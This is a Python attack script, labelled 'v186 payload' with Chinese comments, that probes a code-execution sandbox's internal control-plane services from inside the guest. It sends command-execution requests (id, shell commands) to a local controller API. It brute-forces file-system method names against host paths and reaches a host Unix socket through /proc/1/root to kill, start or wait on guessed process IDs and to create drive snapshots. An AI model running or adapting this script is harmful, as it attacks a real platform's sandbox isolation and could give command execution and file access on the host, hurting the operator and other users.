# -*- coding: utf-8 -*-
"""v186 payload: 控制面 API 深度利用验证 (宿主 root 视角, guest 执行)
1. ExecCommand 变体 → command_id → WaitCommand/StreamOutput 拿输出
2. FileSystemService 全方法 (宿主任意路径读写?)
3. ProcessService ID 变体
4. DrivesService.CreateSnapshot drive_id=sandbox
输出 /vercel/sandbox/v186c.out"""
import socket, time, json, os, signal, re

OUT = '/vercel/sandbox/v186c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(272)


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def post(ip, port, path, body, t=4):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((ip, port))
        hdrs = 'POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:3000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def punix(sp, path, body, t=4):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(b)
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:3000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


CTRL = 'vercel.sandbox.api.controller.v1.ControllerService'
FS = 'vercel.sandbox.api.controller.v1.FileSystemService'
CELL = '/proc/1/root/run/cell/cell.sock'

# ============ 1: ExecCommand 变体 ============
log('=== 1 ExecCommand ===')
for i, body in enumerate([
    {'command': 'id'},
    {'command': 'id', 'args': []},
    {'command': '/bin/sh', 'args': ['-c', 'id; hostname; cat /etc/hostname 2>&1']},
    {'command': ['/bin/sh', '-c', 'id']},
    {'command': {'command': 'id'}},
    {'command': 'id', 'cwd': '/tmp', 'env': {}},
    {'command': '/bin/echo', 'args': ['PWN186_OK'], 'cwd': '/tmp'},
]):
    st, pay = post('127.0.0.1', 23456, '/' + CTRL + '/ExecCommand', body)
    log('EC%d %s -> %s %r' % (i, json.dumps(body)[:120], st, pay[:500]))
    time.sleep(0.3)

# 用 wait command 拿输出 (command_id 从上面的响应中找)
log('=== 2 WaitCommand ===')
for i in range(7):
    st, pay = post('127.0.0.1', 23456, '/' + CTRL + '/WaitCommand', {'commandId': 'cmd_%d' % i})
    log('WC%d -> %s %r' % (i, st, pay[:300]))
    time.sleep(0.2)

# ============ 3: FileSystemService 全方法 ============
log('=== 3 FileSystemService ===')
fs_methods = ['Read', 'Write', 'List', 'Get', 'Stat', 'Open', 'Exists', 'Mkdir', 'MkdirAll',
              'RemoveAll', 'ReadFile', 'ReadDir', 'ListDir', 'Rename', 'Copy', 'Move', 'Info',
              'Readlink', 'Chmod', 'Chown', 'Symlink', 'GetInfo', 'Ls', 'Cat', 'Touch',
              'WriteFile', 'Append', 'Create']
for m in fs_methods:
    for path in ['/etc/hostname', '/tmp', '/']:
        st, pay = post('127.0.0.1', 23456, '/' + FS + '/' + m, {'path': path})
        if '404' not in st:
            log('FS HIT %s %s -> %s %r' % (m, path, st, pay[:400]))
        time.sleep(0.08)

# ============ 4: ProcessService ID 变体 ============
log('=== 4 ProcessService ===')
PS = 'vercel.hive.cell.api.processes.v1.ProcessService'
pids = ['hvcp_52ae126c18e34e85b1921ebbe93', 'a' * 32, '0' * 32, 'hvcp_' + 'a' * 26,
        '52ae126c18e34e85b1921ebbe93'[:32], 'hvcp_00000000000000000000000000']
for m in ['Kill', 'Start', 'Wait']:
    for pid in pids:
        st, pay = punix(CELL, '/' + PS + '/' + m, {'processId': pid})
        if '404' not in st and 'invalid length' not in st:
            log('PS %s %s -> %s %r' % (m, pid[:28], st, pay[:300]))
        time.sleep(0.08)

# ============ 5: CreateSnapshot ============
log('=== 5 CreateSnapshot ===')
DR = 'vercel.hive.cell.api.drives.v1.DrivesService'
for body in [{'driveId': 'sandbox'}, {'driveId': 'sandbox', 'name': 'x'}, {'drive_id': 'sandbox'}]:
    st, pay = punix(CELL, '/' + DR + '/CreateSnapshot', body)
    log('SNAP %s -> %s %r' % (json.dumps(body), st, pay[:500]))
    time.sleep(0.3)

# ============ 6: ControllerService 其他方法 ============
log('=== 6 Controller others ===')
for m in ['GetStatus', 'GetInfo', 'Status', 'Info', 'ListCommands', 'GetCommand',
          'StartCommand', 'StopCommand', 'StreamOutput', 'GetConfig', 'ListSnapshots',
          'RestoreSnapshot', 'DeleteSnapshot', 'GetSnapshot', 'List']:
    st, pay = post('127.0.0.1', 23456, '/' + CTRL + '/' + m, {})
    if '404' not in st:
        log('CTRL %s -> %s %r' % (m, st, pay[:400]))
    time.sleep(0.08)

log('V186_DONE')
f.close()
